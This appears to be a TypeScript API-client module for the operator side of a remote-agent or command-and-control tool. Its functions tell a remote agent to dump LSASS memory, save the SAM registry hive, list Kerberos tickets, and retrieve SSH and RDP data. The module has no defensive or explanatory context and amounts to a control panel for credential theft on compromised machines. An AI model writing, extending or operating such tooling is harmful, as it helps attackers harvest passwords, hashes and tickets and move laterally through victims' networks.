import { api } from './client';
import type { SSHResult, RDPResult } from '../types/models';

export function getSSH(agentId: string): Promise<SSHResult> {
  return api.post<SSHResult>(`/othersoft/${agentId}/ssh`);
}

export function getRDP(agentId: string): Promise<RDPResult> {
  return api.post<RDPResult>(`/othersoft/${agentId}/rdp`);
}

export interface KlistTicket {
  server: string;
  realm: string;
  start: number;
  end: number;
  encryption: number;
  flags: string;
}

export interface KlistResult {
  success: boolean;
  tickets?: KlistTicket[];
  error?: string;
}

export function dumpLsass(agentId: string, path: string): Promise<{ success: boolean; path?: string; error?: string }> {
  return api.post(`/othersoft/${agentId}/lsass`, { path });
}

export function klist(agentId: string): Promise<KlistResult> {
  return api.post<KlistResult>(`/othersoft/${agentId}/klist`);
}

export function saveSam(agentId: string, dir: string): Promise<{ success: boolean; error?: string }> {
  return api.post(`/othersoft/${agentId}/sam`, { dir });
}
